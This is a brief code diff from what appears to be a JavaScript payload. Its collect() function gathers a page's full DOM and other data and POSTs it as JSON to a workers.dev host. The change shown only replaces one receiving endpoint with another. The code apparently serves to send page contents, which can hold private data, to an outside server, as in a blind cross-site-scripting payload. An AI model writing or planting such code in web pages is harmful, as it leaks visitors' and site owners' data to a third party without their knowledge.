@@ -39,7 +39,7 @@ export async function collect() {
         dom: document.documentElement.outerHTML,
     };
 
-    await fetch("https://js.swept-amino-spent.workers.dev", {
+    await fetch("https://x.xql.workers.dev/", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
